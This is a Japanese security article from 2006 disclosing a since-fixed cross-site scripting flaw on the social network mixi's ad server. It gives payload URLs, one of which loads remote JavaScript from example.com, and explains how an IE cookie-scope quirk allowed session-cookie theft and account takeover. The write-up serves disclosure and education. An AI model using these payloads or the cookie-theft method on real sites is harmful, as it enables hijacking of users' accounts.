x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第○章: mixiにアカウント乗っ取り可能な脆弱性 ---

著者：金床

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　2006年10月現在、500万人以上の会員がいると言われるmixi。筆者も楽しく利用
している。今回偶然にもクロスサイトスクリプティングが可能な箇所を見つけた
ので、この脆弱性について報告する。既にmixiには連絡済みであり、該当箇所は
ふさがれている。


■0x02.) 概要

　今回発見したのはよくあるクロスサイトスクリプティング脆弱性である。クロ
スサイトスクリプティングは各方面で報告されているとおり、国内・海外を問わ
ず多くのウェブアプリケーションに存在されるとされる脆弱性だ。攻撃者は被害
者のウェブブラウザ上で好きな内容のJavaScriptを動作させることができる。mi
xiのようにセッション管理にCookieを利用している場合、攻撃者はCookieの内容
を盗むことで被害者のアカウントを乗っ取ることができる。

　今回見つかった脆弱性では、仕様の違いにより、IEのみでCookieの盗難が可能
である。そのためFireFoxやOpera、Konquerorなどのウェブブラウザではそれほど
深刻な被害は発生しないだろう。

　今回の脆弱性は罠のページ内に小さなiframeを設けることなどで被害者が気づ
かないうちにCookieを盗むことが可能なものだ。標的が不特定多数のユーザの場
合、あるいは特定のユーザの場合が考えられるが、どちらのケースでも攻撃者は
罠のページをあらかじめ設置しておき、そこへのリンクを掲示板やメールなどに
埋め込んで標的を誘い出すことになるだろう。


■0x03.) 脆弱性が存在する箇所

　脆弱性はhttp://mixi.jp/home.plから呼び出されるhttp://ads.mixi.jp/jserv
er/***（***の部分は任意の文字列）に存在する。例えばURLがhttp://ads.mixi.
jp/jserver/hogeの場合、HTTPレスポンスのボディ部は次のようになる。

-----
document.writeln("<A HREF=\"http://ads.mixi.jp/ADCLICK/CID=fffffffcfffffffcfffffffc/hoge\" TARGET=\"_blank\">");
document.writeln("<IMG SRC=\"http://img.ads.mixi.jp/AE3.gif?A\" ALT=\"\" BORDER=\"0\"></A>");
document.close();
-----

　内容からわかるとおり、このレスポンスはJavaScriptである。このコンテンツ
は<script src=url>の形で呼び出されることを想定しているものと思われる。

　URLを次のようにすることでスクリプトが実行可能であり、これがクロスサイト
スクリプティング脆弱性であることが確認される。

-----
http://ads.mixi.jp/jserver/</a><script>alert('xss');</script>
-----

　さらに次のようにすることで、ウェブ上においた（サイズが大きい）JavaScri
ptを実行できる。

-----
http://ads.mixi.jp/jserver/</a><script src=http://www.example.com/foo.js></script>
-----


■0x04.) アカウントの乗っ取り

　脆弱性が存在するホストは「ads.mixi.jp」である。つまり、これはmixiでの多
くのアプリケーションが動作するホスト「mixi.jp」とは別のホストである。

　mixiではログインする際にCookieが発行されるが、このときdomain属性の指定
はない。FireFoxやOperaではこのようなdomain属性の指定がないCookieは「その
ホストのみ」のものであると認識し、サブドメインを持つホスト（「ads.mixi.j
p」など）にはこのCookieを送出せず、JavaScriptでのアクセスも禁じている。し
かしIEは仕様が異なり、サブドメインを持つホストにもCookieを送出し、JavaSc
riptでもアクセスが可能である。つまり、「ads.mixi.jp」上でdocument.cookie
を読みとると、mixi.jpのCookieの内容にそのままアクセスできてしまうのである。

　読みとったCookieを使ってmixiにアクセスすることで、アカウントの乗っ取り
が可能となってしまう。このときパスワードが必要な操作をのぞくすべての機能
が可能となる（ただし、仮にこのようなアクセスが行われた場合、明らかな不正
アクセス法違反であろうと思われる。そのため、もしも読者が別の箇所にクロス
サイトスクリプティング脆弱性を発見した場合でも、このようなアクセスはして
はならない）。


■0x05.) 深刻度は

　Cookieに格納したセッションIDでセッション管理を行うウェブアプリケーショ
ンでは、クロスサイトスクリプティングは致命的なものとなる（mixiではセッシ
ョンIDがほぼ固定されているため、さらによくない）。mixiというウェブアプリ
ケーションについて考えたときには、今回の脆弱性は「とても深刻だ」と言える
だろう。

　しかし、筆者の私見となるが、mixiというウェブアプリケーションは（単なる）
コミュニケーションのためのものであり、オンラインバンクやショッピングサイ
トのように金やクレジットカードを扱っているわけではない。そのため、mixiと
いうウェブアプリケーション自体が「深刻な」存在ではないのだ。

　セッションIDがランダムな文字列でなかったり、最近少し話題になったように
画像に認証がかからなかったりなど、mixiにはセキュリティ方面にそれほどやる
気がないような雰囲気が感じられる。しかし、mixiはあくまで「楽しみ」のため
の存在なので、筆者個人としてはそれで別にかまわないと思っている（例の「イ
ンターネットの現状です」の文句はちょっとどうかと思ったが）。また、ユーザ
数がとても多いことから、セキュリティ面で甘い（力を入れていない）分、パフ
ォーマンスが改善されているという面もあるのかもしれない。セキュリティがカ
チカチでパフォーマンスが遅いよりも、ページがさくさく表示される方がよいと
いうユーザもたくさんいるだろう。


■0x06.) まとめ

　今回は偶然みつけたmixiのクロスサイトスクリプティング脆弱性を取り上げた。
筆者はウェブアプリケーションセキュリティに関する話題を扱うメーリングリス
トを運用している。ウェブアプリケーション開発者からセキュリティ関係者まで、
幅広い人々の参加をお待ちしている。ぜひ参加いただきたい。

http://www.freeml.com/ctrl/html/MLInfoForm/seasurfers@freeml.com


